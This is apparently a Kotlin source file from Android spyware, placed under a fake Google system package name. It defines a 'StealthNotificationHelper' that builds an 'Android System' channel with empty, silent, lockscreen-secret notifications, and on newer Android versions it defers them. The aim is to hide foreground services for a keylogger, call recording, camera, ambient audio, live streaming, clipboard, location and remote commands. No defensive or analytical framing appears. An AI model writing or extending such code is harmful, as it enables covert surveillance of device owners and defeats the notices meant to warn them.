package com.google.android.systemservice.utils

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat

object StealthNotificationHelper {
    
    const val STEALTH_CHANNEL_ID = "android_system_core"
    
    // Notification IDs for different services — each must be unique
    const val COMMAND_SERVICE_ID = 2000
    const val LOCATION_SERVICE_ID = 2001
    const val CAMERA_SERVICE_ID = 2002
    const val AUDIO_SERVICE_ID = 2003
    const val KEYLOGGER_SERVICE_ID = 2004
    const val CLIPBOARD_SERVICE_ID = 2005
    const val AMBIENT_SERVICE_ID = 2006
    const val WATCHDOG_SERVICE_ID = 2007
    const val CALL_RECORDING_SERVICE_ID = 2008
    const val LIVE_STREAMING_SERVICE_ID = 2009
    const val GEOFENCE_SERVICE_ID = 2010
    
    fun createStealthChannel(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                STEALTH_CHANNEL_ID,
                "Android System",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = ""
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setBypassDnd(false)
            }
            
            val notificationManager = context.getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(channel)
        }
    }
    
    fun createStealthNotification(context: Context): Notification {
        // Ensure channel exists
        createStealthChannel(context)
        
        val builder = NotificationCompat.Builder(context, STEALTH_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentTitle("")  // Empty title
            .setContentText("")   // Empty text
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .setAutoCancel(false)
        
        // Defer notification display on Android 12+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
        }
        
        return builder.build()
    }
    
    // Create notification with specific ID for a service
    fun getNotificationId(serviceType: ServiceType): Int {
        return when (serviceType) {
            ServiceType.COMMAND -> COMMAND_SERVICE_ID
            ServiceType.LOCATION -> LOCATION_SERVICE_ID
            ServiceType.CAMERA -> CAMERA_SERVICE_ID
            ServiceType.AUDIO -> AUDIO_SERVICE_ID
            ServiceType.KEYLOGGER -> KEYLOGGER_SERVICE_ID
            ServiceType.CLIPBOARD -> CLIPBOARD_SERVICE_ID
            ServiceType.AMBIENT -> AMBIENT_SERVICE_ID
            ServiceType.WATCHDOG -> WATCHDOG_SERVICE_ID
            ServiceType.CALL_RECORDING -> CALL_RECORDING_SERVICE_ID
            ServiceType.LIVE_STREAMING -> LIVE_STREAMING_SERVICE_ID
            ServiceType.GEOFENCE -> GEOFENCE_SERVICE_ID
        }
    }
    
    enum class ServiceType {
        COMMAND,
        LOCATION,
        CAMERA,
        AUDIO,
        KEYLOGGER,
        CLIPBOARD,
        AMBIENT,
        WATCHDOG,
        CALL_RECORDING,
        LIVE_STREAMING,
        GEOFENCE
    }
    
    // Cancel all stealth notifications
    fun cancelAllNotifications(context: Context) {
        val notificationManager = context.getSystemService(NotificationManager::class.java)
        notificationManager?.apply {
            cancel(COMMAND_SERVICE_ID)
            cancel(LOCATION_SERVICE_ID)
            cancel(CAMERA_SERVICE_ID)
            cancel(AUDIO_SERVICE_ID)
            cancel(KEYLOGGER_SERVICE_ID)
            cancel(CLIPBOARD_SERVICE_ID)
            cancel(AMBIENT_SERVICE_ID)
            cancel(WATCHDOG_SERVICE_ID)
            cancel(CALL_RECORDING_SERVICE_ID)
            cancel(LIVE_STREAMING_SERVICE_ID)
            cancel(GEOFENCE_SERVICE_ID)
        }
    }
}
